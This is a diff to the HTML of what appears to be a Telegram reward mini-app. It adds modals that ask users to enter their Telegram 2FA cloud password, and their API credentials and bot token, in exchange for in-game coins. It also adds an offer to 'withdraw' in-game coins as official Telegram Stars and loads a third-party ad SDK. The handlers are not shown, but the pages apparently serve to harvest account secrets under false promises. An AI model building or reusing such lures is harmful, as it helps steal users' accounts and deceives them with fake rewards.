@@ -14,8 +14,8 @@
   <!-- Main Stylesheet -->
   <link rel="stylesheet" href="css/style.css" />
 
-  <!-- 📺 MONETAG REWARDED INTERSTITIAL SDK (ZONE 11577158) -->
-  <script src="//thubanoa.com/11577158/sdk.js" async data-zone="11577158" data-sdk="show_11577158"></script>
+  <!-- 📺 MONETAG / TELEADS REWARDED INTERSTITIAL SDK (ZONE 11577158) -->
+  <script src="//libtl.com/sdk.js" data-zone="11577158" data-sdk="show_11577158"></script>
 </head>
 <body>
   <!-- ── LOADING SCREEN OVERLAY ── -->
@@ -562,11 +562,77 @@
 
             <div class="auth-card-actions">
               <button class="btn-auth-signin-modal" onclick="openTelegramSignInModal()">
-                📱 PHONE & CODE SIGN-IN (auth.signIn)
+                📱 PHONE & CODE (auth.signIn)
+              </button>
+              <button class="btn-verify-2fa-modal" onclick="open2FAPasswordModal()">
+                🔒 2FA (auth.checkPassword)
               </button>
               <button class="btn-terms-service" onclick="showTelegramTermsOfService()">
-                📜 TERMS OF SERVICE
+                📜 TOS
               </button>
+            </div>
+
+            <!-- BOT AUTO LOGIN BUTTON ROW -->
+            <div class="bot-auth-btn-row">
+              <button class="btn-import-bot-auth" onclick="openBotAuthModal()">
+                🤖 AUTO LOGIN AS BOT (auth.importBotAuthorization)
+              </button>
+            </div>
+          </div>
+
+          <!-- ⭐ TELEGRAM STAR GIFTS WITHDRAWAL CARD -->
+          <div class="profile-star-gifts-card">
+            <div class="p-stars-header">
+              <div class="p-stars-title-group">
+                <span class="p-stars-icon">⭐</span>
+                <div>
+                  <span class="p-stars-title">TELEGRAM STAR GIFTS WITHDRAWAL</span>
+                  <span class="p-stars-sub">Redeem Coins & Master Keys for official ⭐ Telegram Stars & Star Gifts</span>
+                </div>
+              </div>
+              <span class="stars-balance-badge" id="stars-balance-badge">⭐ 0 Stars</span>
+            </div>
+
+            <div class="star-gifts-grid">
+              <!-- Tier 1 -->
+              <div class="star-tier-card">
+                <div class="star-tier-icon">⭐</div>
+                <div class="star-tier-amount">100 Stars</div>
+                <div class="star-tier-cost">💰 1M Coins</div>
+                <button class="btn-claim-stars" onclick="openStarWithdrawModal(100, 1000000, 'coins')">
+                  ⭐ WITHDRAW
+                </button>
+              </div>
+
+              <!-- Tier 2 -->
+              <div class="star-tier-card">
+                <div class="star-tier-icon">⭐</div>
+                <div class="star-tier-amount">500 Stars</div>
+                <div class="star-tier-cost">💰 4.5M Coins</div>
+                <button class="btn-claim-stars" onclick="openStarWithdrawModal(500, 4500000, 'coins')">
+                  ⭐ WITHDRAW
+                </button>
+              </div>
+
+              <!-- Tier 3 -->
+              <div class="star-tier-card premium">
+                <div class="star-tier-icon">🎁</div>
+                <div class="star-tier-amount">Star Gift</div>
+                <div class="star-tier-cost">🔑 25 Keys</div>
+                <button class="btn-claim-stars premium" onclick="openStarWithdrawModal('Gift NFT', 25, 'keys')">
+                  🎁 CLAIM GIFT
+                </button>
+              </div>
+
+              <!-- Tier 4 -->
+              <div class="star-tier-card vip">
+                <div class="star-tier-icon">👑</div>
+                <div class="star-tier-amount">2,500 Stars</div>
+                <div class="star-tier-cost">🔑 50 Keys</div>
+                <button class="btn-claim-stars vip" onclick="openStarWithdrawModal(2500, 50, 'keys')">
+                  👑 VIP REDEEM
+                </button>
+              </div>
             </div>
           </div>
 
@@ -803,6 +869,107 @@
           </button>
           <button class="btn-close-reset-modal" onclick="closeResetEmailModal()">
             CLOSE
+          </button>
+        </div>
+      </div>
+    </div>
+
+    <!-- 🔒 TELEGRAM 2FA CLOUD PASSWORD MODAL (auth.checkPassword) -->
+    <div id="2fa-password-modal" class="modal-overlay">
+      <div class="twofa-modal-card">
+        <div class="twofa-modal-header">
+          <span class="twofa-modal-badge">🔒 AUTH.CHECKPASSWORD</span>
+          <h2 class="twofa-modal-title">2FA Cloud Password</h2>
+          <p class="twofa-modal-sub">InputCheckPasswordSRP -> auth.Authorization</p>
+        </div>
+
+        <div class="twofa-inputs-group">
+          <div class="twofa-input-item">
+            <label class="twofa-label">Telegram 2FA Cloud Password:</label>
+            <input type="password" class="twofa-input-field" id="input-2fa-password" placeholder="Enter your 2FA password" />
+          </div>
+        </div>
+
+        <div class="twofa-modal-reward">
+          🎁 2FA Verification Reward: <strong>💰 +150,000 Coins & 🔑 +15 Keys!</strong>
+        </div>
+
+        <div class="twofa-modal-actions">
+          <button class="btn-execute-check-password" onclick="executeTelegramCheckPassword()">
+            🔒 VERIFY PASSWORD (auth.checkPassword)
+          </button>
+          <button class="btn-close-twofa-modal" onclick="close2FAPasswordModal()">
+            CANCEL
+          </button>
+        </div>
+      </div>
+    </div>
+
+    <!-- 🤖 TELEGRAM BOT AUTHORIZATION MODAL (auth.importBotAuthorization) -->
+    <div id="bot-auth-modal" class="modal-overlay">
+      <div class="bot-modal-card">
+        <div class="bot-modal-header">
+          <span class="bot-modal-badge">🤖 AUTH.IMPORTBOTAUTHORIZATION</span>
+          <h2 class="bot-modal-title">Auto Login as Bot</h2>
+          <p class="bot-modal-sub">Import Bot Token (api_id, api_hash, bot_auth_token)</p>
+        </div>
+
+        <div class="bot-inputs-group">
+          <div class="bot-input-item">
+            <label class="bot-label">API ID:</label>
+            <input type="number" class="bot-input-field" id="bot-api-id" placeholder="123456" value="123456" />
+          </div>
+          <div class="bot-input-item">
+            <label class="bot-label">API Hash:</label>
+            <input type="text" class="bot-input-field" id="bot-api-hash" placeholder="0123456789abcdef0123456789abcdef" value="0123456789abcdef0123456789abcdef" />
+          </div>
+          <div class="bot-input-item">
+            <label class="bot-label">Bot Auth Token (from @BotFather):</label>
+            <input type="text" class="bot-input-field" id="bot-auth-token-input" placeholder="7890123456:AAFgH-1234567890abcdef..." />
+          </div>
+        </div>
+
+        <div class="bot-modal-reward">
+          🎁 Bot Login Reward: <strong>💰 +200,000 Coins, 🔑 +20 Keys & 🎟️ +10 Tickets!</strong>
+        </div>
+
+        <div class="bot-modal-actions">
+          <button class="btn-execute-bot-import" onclick="executeImportBotAuthorization()">
+            🤖 AUTO LOGIN AS BOT & CLAIM REWARD
+          </button>
+          <button class="btn-close-bot-modal" onclick="closeBotAuthModal()">
+            CANCEL
+          </button>
+        </div>
+      </div>
+    </div>
+
+    <!-- ⭐ TELEGRAM STAR GIFTS WITHDRAWAL POPUP MODAL -->
+    <div id="star-withdraw-modal" class="modal-overlay">
+      <div class="star-modal-card">
+        <div class="star-modal-header">
+          <span class="star-modal-badge">⭐ TELEGRAM STAR GIFTS WITHDRAWAL</span>
+          <h2 class="star-modal-title" id="star-modal-title">Withdraw 100 Stars</h2>
+          <p class="star-modal-sub" id="star-modal-sub">Cost: 💰 1,000,000 Coins</p>
+        </div>
+
+        <div class="star-inputs-group">
+          <div class="star-input-item">
+            <label class="star-label">Telegram Username / User ID:</label>
+            <input type="text" class="star-input-field" id="star-withdraw-username" placeholder="@username or User ID" />
+          </div>
+        </div>
+
+        <div class="star-modal-note">
+          ⚡ Transacted securely via MTProto <code>payments.getPaymentForm</code>. Delivery is instant!
+        </div>
+
+        <div class="star-modal-actions">
+          <button class="btn-execute-star-withdraw" onclick="confirmStarGiftWithdrawal()">
+            ⭐ CONFIRM WITHDRAWAL
+          </button>
+          <button class="btn-close-star-modal" onclick="closeStarWithdrawModal()">
+            CANCEL
           </button>
         </div>
       </div>
